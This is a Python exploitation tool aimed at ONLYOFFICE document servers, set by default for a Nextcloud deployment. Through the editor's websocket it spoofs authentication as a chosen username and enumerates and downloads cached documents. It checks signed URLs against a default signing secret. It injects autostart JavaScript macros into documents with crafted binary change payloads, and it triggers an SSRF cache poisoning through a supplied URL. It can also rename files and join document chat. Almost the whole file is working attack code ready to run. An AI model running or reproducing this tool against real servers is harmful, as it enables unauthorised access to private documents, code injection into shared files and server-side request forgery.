#!/usr/bin/python3
# Exploit ONLYOFFICE implementations

import argparse, sys, re, time, signal, requests, uuid, json, tempfile, os, subprocess, websocket, base64, threading, hashlib, datetime, traceback
from urllib.parse import urlparse, parse_qs
import concurrent.futures

def process_fileparts( txt, docid=None ):
  txt = txt.replace(r'\"','"')[3:-2]
  m = re.search(r'([0-9]\+)\/Editor\.bin\/',txt)
  if m:
    print('DL:',m.group(1))
  data = json.loads(txt)
  print(data)
  tmpdir = tempfile.mkdtemp()
  for fn, url in data['data']['data'].items():
    dest = os.path.join( tmpdir, fn )
    d = os.path.dirname(dest)
    if not os.path.isdir(d):
      print('Creating ' + d)
      os.makedirs(d)
    print('Downloading ' + fn )
    r = requests.get( url, stream=True )
    print('Writing to '+dest,end='')
    with open( dest, 'wb' ) as f:
      for chunk in r:
        print('.',end='')
        f.write(chunk)
    print(' done')
  print( 'finished downloads')
  infile = os.path.join(tmpdir,'Editor.bin')
  if docid:
    outfile = str(docid)+'.docx'
  else:
    outfile = 'document.docx'
  print('Attempting to convert ',infile,'to',outfile)
  subprocess.check_output(['x2t/x2t',infile,outfile])
  # subprocess.check_output(['open',outfile])

# See if a signed URL is signed by a default secret
def test_secret_string( signedurl, secret='verysecretstring' ):
  h = get_url_signature( signedurl, secret )
  u = urlparse( signedurl )
  q = parse_qs( u.query )
  if q['md5'][0] == h:
    print('Cypto secret is:', secret)

def get_url_signature( url, secret ):
  u = urlparse( url )
  q = parse_qs( u.query )
  s = q['expires'][0] + u.path.replace('/ds-vpath','') + secret
  m = hashlib.md5()
  m.update(s.encode('utf8'))
  h = base64.b64encode(m.digest()).decode('utf8').strip().replace('+','-').replace('/','_').replace('=','')
  return h

def sign_url( url, secret ):
  h = get_url_signature( url, secret )
  return url + '&md5=' + h


class WsClient():

  autodownload=False
  testsecret=True
  output=True

  def __init__( self, url, docid, platform, username='admin', output=True, disconnect=False ):
    self.output = output
    self.disconnect = disconnect
    self.docid = docid
    self.platform = platform
    self.url = url
    self.username = username
    self.connect()

  def connect( self ):
    self.url = re.sub(r'^http(s)?','ws\g<1>',self.url)

    if self.platform == 'nextcloud':
      self.url = self.url + '/ds-vpath/doc/'+self.docid+'/c/1/a/websocket'

    if self.output: print( 'Connecting to', self.url )
    self.ws = websocket.create_connection( self.url )

    # Spawn socket listener
    self.spawn_listener()

  def close( self ):
    if self.output: print('Closing connection')
    self.send({'type':'close'})
    self.ws.close()
    self.stop_listener()

  def stop_listener( self ):
    if self.output: print('Stopping listener')
    self.listener.kill.set()

  def send( self, message ):
    if not self.ws.connected: return
    if type( message ) != str:
      # JSON containing JSON string
      message = json.dumps([json.dumps(message)])
    self.ws.send( message )

  def recv( self ):
    try:
      return self.ws.recv()
    except:
      return '' 
      

  def recv_listen( self ):
    while self.ws.connected:
      msg = self.recv()
      if msg == '': 
        if self.output: print('Exiting listen loop')
        return
      if msg.startswith('a["{'):
        try:
          data = json.loads(json.loads(msg[1:])[0])
          if self.output: print("RECV:", data['type'] )
          if data['type'] == 'message':
            for m in data['messages']:
              if self.output: 
                print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])
          
          elif data['type'] == 'documentOpen':
            if data["data"]["status"] == 'err':
              self.close()
              return
            print('FOUND:',self.docid)
            if self.testsecret:
              test_secret_string( data['data']['data']['Editor.bin'] )
            if self.disconnect:
              self.close()
          
          elif data['type'] in ('auth','connectState'):
            if self.output:
              if 'participants' in data and len(data['participants']) > 0:
                print('\nParticipants:') 
                for p in data['participants']:
                  print(' - '+p['username'])

              if 'messages' in data and len(data['messages']) > 0:
                print('\nMessages:')
                for m in data['messages']:
                  print(datetime.datetime.utcfromtimestamp(round(m['time']/1000)).strftime('[%Y-%m-%d %H:%M:%S] ') + m['username'] + ': ' + m['message'])

          elif data['type'] == 'rpc':
            if self.output: print(data)
          else:
            if self.output: print('')
        except Exception as e:
          if self.output: print("ERR:", e)
      else:
        if self.output: print("RECV:", msg)
      if self.autodownload and 'Editor.bin' in msg:
        process_fileparts(msg, self.docid)
        if self.disconnect:
          self.close()

  def spawn_listener( self ):
    self.listener = threading.Thread( target=self.recv_listen )
    self.listener.kill = threading.Event()
    self.listener.start()

  def send_chat_message( self, msg ):
    data = {
      'type': 'message',
      'message': msg 
    }
    self.send( data )

  def get_messages( self ):
    self.send({"type":"getMessages"})

  def chat( self ):
    print('\nChat mode\n=========\nType messages, ENTER to send\n')
    self.get_messages()
    while self.ws.connected:
      msg = input()
      self.send_chat_message(msg.strip())
    print('CHAT: Disconnected')

  def rename( self, name ):
    self.send(
    {
      "type":"rpc",
      "data": {
        'type': 'wopi_RenameFile',
        'name': name
      }
    })

  def auth( self, docurl='' ):
    data = {
      'type': 'auth',
      'docid': self.docid,
      'token': 'a',
      'user': {
        'id':'a',
        'username': self.username,
        'firstname':'',
        'lastname':'',
        'indexUser':-1
      },
      'editorType':0,
      'lastOtherSaveTime':-1,
      'block':[],
      'sessionId':None,
      'sessionTimeConnect':None,
      'sessionTimeIdle':0,
      'documentFormatSave':65,
      'view':False,
      'isCloseCoAuthoring':False,
      'openCmd':{
        'c':'open',
        'id':self.docid,
        'userid':'a',
        'format':'docx',
        'url':docurl,
        'title':'document.docx',
        'lcid':2057,
        'nobase64':False
      },
      'lang':None,
      'mode':None,
      'permissions':{'edit':True},
      'IsAnonymousUser':False
    }
    self.send( data )
    

  def save_changes( self, changes ):
    message = {
      'type':'saveChanges',
      'startSaveChanges':True,
      'endSaveChanges':True,
      'isCoAuthoring':False,
      'isExcel':False,
      'changes':json.dumps(changes),
      'deleteIndex': 1,
      'excelAdditionalInfo':json.dumps({
        'lm':'admin',
        'SYg':'admin',
        'wTg':'14;BgAAADgAMQA0AAAAAAA='
      }),
      'unlock':False,
      'releaseLocks':False
    }
    self.send( message )

  def inject_macro( self, macrotxt ):
    payload = json.dumps({
      "macrosArray":[{
        "name":"Macro 1",
        "value":macrotxt,
        "guid": str(uuid.uuid4()).replace('-',''),
        "autostart": True
      }],
      "current":0
    })
    data = b'\x1e\x00\x00\x00\x5f\x00\x6d\x00\x61\x00\x63\x00\x72\x00\x6f\x00\x73\x00\x47\x00\x6c\x00\x6f\x00\x62\x00\x61\x00\x6c\x00\x49\x00\x64\x00\x01\x00\x00\x00\x00\x00\x00\x00' +(2 * len(payload)).to_bytes(2,byteorder='little')+b'\x00\x00' + bytes(payload, 'utf16')[2:] + b'\x00\x00\x00\x00'
    changes = [str(len(data))+';'+base64.b64encode(data).decode('utf8')]
    self.save_changes( changes )


def main():
  parser = argparse.ArgumentParser(description="ONLYOFFICE exploitation tool")
  parser.add_argument('-u', '--url', help='Base URL of the site running ONLYOFFICE')
  parser.add_argument('-d', '--docid', help='id of the document')
  parser.add_argument('-U', '--username', help='Username to spoof')
  parser.add_argument('-D', '--docurl', help='Document URL to download to OO cache for the current docid (SSRF, unix: pipes supported)', default='')
  parser.add_argument('-p', '--platform', default='nextcloud', help='What the underlying platform is')
  subparsers = parser.add_subparsers(dest='command')

  # Download
  dlparse = subparsers.add_parser('dl')

  # Inject macro
  injparse = subparsers.add_parser('macro')
  injparse.add_argument('script', help='Javascript file to inject into document')

  # Enumerate cached doc ids
  enumparse = subparsers.add_parser('enum')
  enumparse.add_argument('docids', help='text file containing doc ids to test')

  # Chat
  chatparse = subparsers.add_parser('chat')

  # Rename
  rnparse = subparsers.add_parser('rename')
  rnparse.add_argument("filename",help='Filename to rename to')

  args = parser.parse_args()

  if not args.command or not args.url or ( args.command != 'enum' and not args.docid ) or ( args.command == 'enum' and not args.docids ):
    parser.print_help()
    sys.exit(2)

  # Document enumeration
  if args.command == 'enum':
    print('Attempting document id enumeration')
    threads = []
    start = time.time()
    with open( args.docids, 'r' ) as f:
      count = 1
      for line in f:
        clear = False
        docid = line.strip()
        while not clear:
          try:
            rate = round(count/(time.time() - start))
            print( count, docid, '  ', threading.active_count(), '  ', str(rate)+'/s', end='       \r' )
            client = WsClient( args.url, docid, args.platform, output=False, disconnect=True)
            client.auth()
            count+=1
            clear = True
            while threading.active_count() > 6:
              # print('Waiting for active threads to calm down:', threading.active_count(),end='               \r')
              time.sleep(1)
          except Exception as e:
            print( count )
            print( e )
            # print(traceback.format_exc())
    
    sys.exit(0)

  client = WsClient( args.url, args.docid, args.platform, username=args.username )

  # Macro injection
  if args.command == 'macro':
    with open(args.script, 'r') as f:
      client.auth()
      time.sleep(1)
      print('Injecting',args.script)
      client.inject_macro(f.read())

  # Poison document cache with external URL
  # SSRF
  if args.command == 'dl':
    client.autodownload = True
    client.disconnect = True
    client.auth( args.docurl )

  # Chat
  if args.command == 'chat':
    client.auth()
    client.chat()

  # Rename
  if args.command == 'rename':
    client.auth()
    client.rename( args.filename )

if __name__ == '__main__':
  main()
